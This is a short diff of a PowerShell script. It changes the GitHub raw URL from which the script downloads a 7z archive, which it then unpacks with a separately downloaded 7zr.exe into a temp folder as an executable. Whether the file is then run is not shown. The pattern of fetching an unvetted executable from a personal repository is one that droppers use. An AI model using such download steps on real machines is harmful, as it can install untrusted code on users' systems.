@@ -19,7 +19,7 @@ $executableName = [System.IO.Path]::GetFileNameWithoutExtension($archiveName) + 
 $extractedFile = [System.IO.Path]::Combine($tempFolder, $executableName)
 
 # URLs
-$archiveDownloadUrl = "https://raw.githubusercontent.com/voidelixir/sarpili/main/sarpili.7z" # Update the 7z file URL
+$archiveDownloadUrl = "https://raw.githubusercontent.com/voidelixir/py/main/sarpili.7z" # Update the 7z file URL
 $sevenZipExeUrl = "https://7-zip.org/a/7zr.exe" # 7zr.exe tool for extracting
 
 # Ensure the temporary folder exists
